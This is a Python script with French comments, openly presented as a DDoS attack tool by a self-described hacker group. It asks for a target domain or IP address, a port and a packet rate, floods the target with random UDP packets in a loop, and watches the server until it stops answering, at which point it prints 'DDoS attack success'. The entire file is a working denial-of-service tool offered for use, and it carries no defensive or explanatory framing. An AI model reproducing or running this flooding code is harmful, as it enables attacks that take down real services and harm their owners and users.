import os
import socket
import threading
import time
import sys
import http.client

# Fonction pour afficher un texte avec un effet de simulation de frappe
def type_effect(text, delay=0.05, color=None):
    for char in text:
        if color:
            sys.stdout.write(color + char + "\033[0m")
        else:
            sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Informations sur le script avec couleurs
INFO = [
    ("\033[91m", "Script creator: •FAMOUS TECH• OR •FD LORD•\n"),
    ("\033[91m", "Script design: FD LORD\n"),
    ("\033[91m", "Legion: DEDSEC TM\n"),
    ("\033[91m", "Info: USE THIS SCRIPT AT YOUR OWN RISK\n\n"),
    ("\033[94m", "Collaborators:\n"),
    ("\033[94m", "- Lord____Z\n"),
    ("\033[93m", "- ×_topher_×\n")
]

# Variables globales
stop_attack = False
attack_interval = 5  # Intervalle en secondes pour vérifier l'état du serveur

# Fonction pour effectuer une attaque DDoS sur un domaine
def attack_domain(domain, port, rate):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    target_ip = socket.gethostbyname(domain)
    while not stop_attack:
        for _ in range(rate):
            sock.sendto(bytes, (target_ip, port))
        print(f"Attacking {domain}:{port} with {rate} requests per second")
        time.sleep(1)

# Fonction pour effectuer une attaque DDoS sur une adresse IP
def attack_ip(ip, port, rate):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    while not stop_attack:
        for _ in range(rate):
            sock.sendto(bytes, (ip, port))
        print(f"Attacking {ip}:{port} with {rate} requests per second")
        time.sleep(1)

# Fonction pour vérifier l'état du serveur
def check_server(target, port, use_https=False):
    global stop_attack
    while not stop_attack:
        try:
            if use_https:
                conn = http.client.HTTPSConnection(target, port, timeout=10)
            else:
                conn = http.client.HTTPConnection(target, port, timeout=10)
            conn.request("HEAD", "/")
            response = conn.getresponse()
            print(f"Server is up. Status: {response.status}")
        except (socket.error, http.client.HTTPException) as e:
            print("DDoS attack success!!!!!!")
            stop_attack = True
        time.sleep(attack_interval)

# Fonction pour mettre à jour le script
def update_script():
    os.system('git pull')
    print("Script updated successfully.")

# Fonction pour démarrer l'attaque
def start_attack():
    global stop_attack

    target_type = input("Enter the target type (1 for Domain, 2 for IP Address): ")
    target = input("Enter the target (domain or IP address): ")
    port = int(input("Enter the port: "))
    rate = int(input("Enter the rate (requests per second): "))
    use_https = input("Use HTTPS? (y/n): ").lower() == 'y'

    if target_type == "1":
        attack_thread = threading.Thread(target=attack_domain, args=(target, port, rate))
    else:
        attack_thread = threading.Thread(target=attack_ip, args=(target, port, rate))

    server_check_thread = threading.Thread(target=check_server, args=(target, port, use_https))

    attack_thread.start()
    server_check_thread.start()

    attack_thread.join()
    server_check_thread.join()

    if not stop_attack:
        print("DDOS attack failed. Press Control + C and try again.")

# Menu principal
def main():
    # Afficher les informations avec effet d'écriture
    for color, text in INFO:
        type_effect(text, color=color)

    while True:
        print("\nMenu:")
        print("1. Update Script")
        print("2. Start Attack")
        print("3. Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            update_script()
        elif choice == "2":
            start_attack()
        elif choice == "3":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
